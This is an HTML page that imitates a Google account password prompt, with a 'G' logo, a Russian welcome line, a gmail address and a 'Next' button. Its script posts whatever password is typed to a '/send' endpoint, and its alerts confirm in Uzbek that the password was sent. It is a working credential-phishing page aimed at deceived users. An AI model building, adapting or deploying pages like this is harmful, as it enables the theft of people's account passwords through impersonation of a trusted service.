<!DOCTYPE html>
<html>
<head>
    <title>Password</title>

    <style>
        body {
            margin: 0;
            height: 100vh;
            background: #202124;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }

        .main {
            width: 900px;
            height: 500px;
            display: flex;
            padding: 40px;
            box-sizing: border-box;
        }

        .left {
            flex: 1;
        }

        .logo {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .title {
            font-size: 32px;
            margin-bottom: 10px;
        }

        .email {
            margin-top: 20px;
            padding: 10px 15px;
            border: 1px solid #5f6368;
            border-radius: 20px;
            display: inline-block;
            font-size: 14px;
        }

        .right {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .input-group {
            position: relative;
            margin-bottom: 15px;
        }

        input {
            width: 100%;
            padding: 16px;
            background: transparent;
            border: 1px solid #5f6368;
            border-radius: 6px;
            color: white;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border: 2px solid #8ab4f8;
        }

        label {
            position: absolute;
            left: 14px;
            top: 16px;
            color: #9aa0a6;
            background: #202124;
            padding: 0 4px;
            transition: 0.2s;
        }

        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: -8px;
            font-size: 12px;
            color: #8ab4f8;
        }

        .checkbox {
            margin-top: 10px;
            font-size: 14px;
        }

        .bottom {
            margin-top: 40px;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 20px;
        }

        .link {
            color: #8ab4f8;
            font-size: 14px;
            cursor: pointer;
        }

        .btn {
            background: #8ab4f8;
            border: none;
            color: black;
            padding: 10px 25px;
            border-radius: 20px;
            cursor: pointer;
            font-weight: 500;
        }

        .btn:hover {
            background: #a1c2fa;
        }

    </style>

</head>
<body>

<div class="main">

    <div class="left">
        <div class="logo">G</div>
        <div class="title">Добро пожаловать!</div>
        <div class="email">user@gmail.com</div>
    </div>

    <div class="right">

        <div class="input-group">
            <input id="msg2" type="password" placeholder=" " required>
            <label>Введите пароль</label>
        </div>

        <div class="checkbox">
            <input type="checkbox" onclick="toggle()"> Показать пароль
        </div>

        <div class="bottom">
            <div class="link">Забыли пароль?</div>
            <button class="btn" onclick="send2()">Далее</button>
        </div>

    </div>

</div>

<script>
function toggle() {
    const input = document.getElementById("msg2");
    input.type = input.type === "password" ? "text" : "password";
}

function send2() {
    const message = document.getElementById("msg2").value;

    if (!message) {
        alert("Parol yoz!");
        return;
    }

    fetch("/send", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ message })
    })
    .then(() => {
        alert("Yuborildi ✅");
    })
    .catch(() => {
        alert("Xatolik ❌");
    });
}
</script>

</body>
</html>
